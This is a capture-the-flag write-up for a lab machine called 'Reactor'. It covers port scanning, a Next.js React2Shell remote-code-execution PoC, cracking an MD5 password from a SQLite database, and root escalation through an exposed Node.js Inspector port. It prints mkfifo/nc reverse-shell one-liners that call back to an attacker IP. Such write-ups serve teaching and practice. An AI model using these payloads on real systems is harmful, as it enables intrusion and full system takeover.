# Reactor

## Recon

### Full Port Scan

```shell
sudo nmap -sT --min-rate 10000 -p- 10.129.17.165 -oA nmapscan/ports
```

```
Nmap scan report for 10.129.17.165
Host is up (0.026s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
3000/tcp open  ppp
```

Only two ports are open: 22 (SSH) and 3000. Port 3000 is a common development/service port in the Node.js ecosystem.

### Service Detection

```shell
sudo nmap -sT -sC -sV -O -p22,3000 10.129.17.165 -oA nmapscan/detail
```

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
3000/tcp open  ppp?
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 200 OK
|     X-Powered-By: Next.js
|     ...
```

Nmap fails to identify the exact service on port 3000, but the `X-Powered-By: Next.js` header shows this is a **Next.js** application.

## Foothold: Next.js React 2 Shell

Open `http://10.129.17.165:3000` in the browser. The page source confirms the Next.js version is **15.0.3**.

![](assets/Pasted%20image%2020260617012656.png)

This version is vulnerable to React2Shell (CVE-2025-55182). Use a public PoC to get a reverse shell.

Start a listener on the attack machine:

```shell
rlwrap ncat -nvlp 9001
```

Run the PoC:

```shell
python3 poc.py http://10.129.17.165:3000 "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.15.172 9001 >/tmp/f"
```

![](assets/Pasted%20image%2020260617013303.png)

This gives an initial reverse shell as the web service user.

## Enumeration and Credential Recovery

There is a `.env` file in the current directory. Check the configuration first:

```
$ cat .env
# ReactorWatch Configuration
# Database connection for sensor data

DB_PATH=/opt/reactor-app/reactor.db
DB_TYPE=sqlite3

# API Keys
SENSOR_API_KEY=rw_sk_7f8a9b2c3d4e5f6g7h8i9j0k
ALERT_WEBHOOK=https://alerts.internal.reactor.htb/webhook

# Node environment
NODE_ENV=production
```

Key takeaway: the database is **sqlite3**.

Running `cat` on the db file reveals the schema, since SQLite stores table definitions in plaintext. One of the tables is `users`:

```
CREATE TABLE users (
    id INTEGER PRIMARY KEY,
    username TEXT NOT NULL,
    password_hash TEXT NOT NULL,
    role TEXT NOT NULL,
    email TEXT
)
```

Read the user data with sqlite3:

```
$ sqlite3 reactor.db
select * from users;
1|admin|a203b22191d744a4e70ada5c101b17b8|administrator|admin@reactor.htb
2|engineer|39d97110eafe2a9a68639812cd271e8e|operator|engineer@reactor.htb
```

The `password_hash` values are 32-character hex strings, which matches MD5. Crack the engineer hash:

```
$ hashcat -m 0 39d97110eafe2a9a68639812cd271e8e /usr/share/wordlists/rockyou.txt.gz
39d97110eafe2a9a68639812cd271e8e:reactor1
```

The engineer password is `reactor1`.

## User

Log in over SSH with the engineer credentials. Read the user flag.

![](assets/Pasted%20image%2020260617015936.png)

## Privilege Escalation: Node.js Inspector

### Finding the Escalation Vector

After logging in, enumerate the locally listening ports:

```shell
ss -tunlp
```

![](assets/Pasted%20image%2020260617014837.png)

Port 9229 is the default Node.js debugging port (Inspector / `--inspect`). Check which process owns it:

```shell
ps aux | grep node
```

![](assets/Pasted%20image%2020260617014940.png)

The Node process is running as **root** with the `--inspect` flag.

This is the escalation point. **The Node Inspector protocol allows executing arbitrary JavaScript inside the context of the debugged process. If that process runs as root, any command executed through it runs as root.** The port is bound to localhost only, which looks safe, but since we already have local access we can forward it to the attack machine over SSH.

### Port Forwarding

Set up a tunnel on the attack machine that maps the remote `127.0.0.1:9229` to the local port:

```
ssh -L 9229:127.0.0.1:9229 engineer@10.129.17.165
```

Now accessing `127.0.0.1:9229` on the attack machine forwards traffic through the tunnel to the target's 9229.

### Connecting to the Inspector

Open `chrome://inspect` in Chrome and confirm that `127.0.0.1:9229` appears under "Remote Target".

![](assets/Pasted%20image%2020260617015308.png)

### Executing Commands

In the Node DevTools console, first verify the execution identity. It returns `root`, confirming root-level execution.

```javascript
require('child_process').execSync('whoami').toString()
```

![](assets/Pasted%20image%2020260617015729.png)

Start another listener on the attack machine:

```shell
rlwrap ncat -lvnp 4444
```

Use the Inspector to make the root process spawn a reverse shell:

```javascript
require('child_process').execSync('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.15.172 4444 >/tmp/f').toString()
```

This gives a root reverse shell. Read the root flag.

![](assets/Pasted%20image%2020260617015854.png)

## Summary

- **Foothold:** React2Shell RCE in Next.js 15.0.3 for an initial shell.
- **Credentials:** A weak MD5 password stored in the SQLite database, cracked to log in over SSH as the user.
- **Privesc:** A root-owned Node process exposed the Inspector debugging port (9229). Forwarding it over SSH and abusing the Inspector protocol allows executing commands as root.